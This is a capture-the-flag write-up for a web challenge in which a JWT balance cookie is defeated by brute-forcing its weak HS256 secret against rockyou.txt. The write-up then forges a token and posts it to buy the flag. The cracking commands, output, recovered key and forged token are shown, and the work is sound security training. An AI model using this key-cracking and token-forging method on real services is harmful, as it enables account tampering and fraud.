# cookies - Web (500 points)

**Flag:** `cdctf{0mNomN0mNomC00k1E5!_24a480be}`
**Files:** no artifact, only the instance `https://xhlvnfzc.i.cdctf.net`

## Problem Description

The "Cookie Trading Post" front page sells one flag for one cookie and states that every user is set
to 0 cookies. Solving means interacting with the web instance: load `/`, let the page script call
`/get_cookie`, then POST to `/purchase_flag`. Flag format `cdctf{Fl4gGo3sH3re!}`.

## Initial Analysis

- `GET /get_cookie` returns `Set-Cookie: user_cookie_balance=<JWT>; Path=/`. The balance is not a plain
  cookie but a JWT payload `{"user_cookie_balance":0}` with header `{"alg":"HS256","typ":"JWT"}`.
- `POST /purchase_flag` with the original token returns `Flag request: DENIED`; a garbage cookie or a
  token signed with a wrong key returns `Invalid token!`. The server does verify the HMAC, so the solution proceeds by recovering the signing key.
- `GET /flag` is a Werkzeug 404, `GET /purchase_flag` is 405; neither route provides further data in these tests.
- `robots.txt` only redirects to YouTube and carries no data.
- The challenge description and the `X-LLM-Agent-Instruction` / `X-LLM-Policy` response headers are the
  event's automation block, not a step of the solution.

## Ruled Out

1. **Editing the balance in the cookie**: the value is a three-segment JWT signed by the server, so any
   manual edit breaks the signature. Rejected.
2. **Server decodes without verifying**: every wrongly signed token produced `Invalid token!`, while the
   original token produced `DENIED`, which means decoding succeeded and the balance test rejected it. Rejected.
3. **Guessable secrets**: 17 theme-based candidates (`cookies`, `chocolate`, `Cookies-and-All-That`,
   `alex`, `cdctf`, `user_cookie_balance`, empty secret...) all returned `Invalid token!`. Rejected.

## Exploitation Chain

**Step 1 - Recover the HMAC key of the original token.** The signature is 32 bytes and the payload is
known and fixed, so the challenge reduces to finding the HS256 key. `rockyou.txt` (14344392 lines) holds
it: 8 Node workers found the key at line 251496 after 35.9 s.

```bash
cd "CDCTF 2026/cookies"
WORKERS=8 node analysis/brute.js
```

```
wordlist=C:/Tools/rockyou.txt lines=14344392 workers=8
SECRET="COOKIEMONSTER" line=251496
FOUND after 35.9s
```

**Step 2 - Forge a non-zero balance and buy the flag.** Same header, payload changed to
`{"user_cookie_balance":1}`, signed with `COOKIEMONSTER`:

```bash
python exploit.py --base https://<instance-id>.i.cdctf.net --wordlist C:/Tools/rockyou.txt
```

```
[+] header={'alg': 'HS256', 'typ': 'JWT'} payload={'user_cookie_balance': 0}
[!] secret = 'COOKIEMONSTER' (line 251497, 19.2s, 251497 candidates)
```

The token produced is
`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2Nvb2tpZV9iYWxhbmNlIjoxfQ.sXJ5IOw2YDk6_guPpvWkeu8Pp7H8reIzI6MnlS-OXo4`.
Sending it to `/purchase_flag` while the instance was alive returned HTTP 200 and the flag:

```
[200] balance=1 -> Cookie Trading Post       "Today me will live in the moment, unless it’s unpleasant in which case me will eat a cookie."   --Cookie Monster       cdctf{0mNomN0mNomC00k1E5!_24a480be}
```

`balance=999` returns the same flag: 999 also passed the balance check. These two tests do not establish the full accepted range.

**Step 3 - Verification.** Verification checks:

```bash
# The cracking harness must find a secret planted in advance, otherwise every "Invalid token!" above proves nothing
# ("taetae07" planted at line 777777 of the same rockyou list, JWT structurally identical)
WORKERS=4 TOK_SIG=<signature-of-planted-token> node analysis/brute.js
# SECRET="taetae07" line=777777 / FOUND after 31.3s

# The recovered key reproduces the original token's signature, no instance needed
python exploit.py --token '<original token>' --secret COOKIEMONSTER
```

```
header={'alg': 'HS256', 'typ': 'JWT'} payload={'user_cookie_balance': 0} secret='COOKIEMONSTER'
signature MATCHES for secret 'COOKIEMONSTER'
forged token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2Nvb2tpZV9iYWxhbmNlIjoxfQ.sXJ5IOw2YDk6_guPpvWkeu8Pp7H8reIzI6MnlS-OXo4
```

The Python token is byte-identical to the Node token that was sent during the solve, so the flag in
Step 2 is the result of exactly the token the packaged script reproduces.

## Flag

```text
cdctf{0mNomN0mNomC00k1E5!_24a480be}
```

## Reproduce

```bash
# Instances are per-player and this one expired (POST now returns 403 error code: 1010); spin up a new one
export CDCTF_URL=https://<instance-id>.i.cdctf.net

python exploit.py                                    # GET /get_cookie, brute, forge, POST
python exploit.py --wordlist C:/Tools/rockyou.txt --balance 1
python exploit.py --token '<original token>' --secret COOKIEMONSTER   # offline verification only
```

`analysis/brute.js` and `analysis/forge.js` are the parallel Node cracking harness; raw
output of every command is in `analysis/captured.txt`.
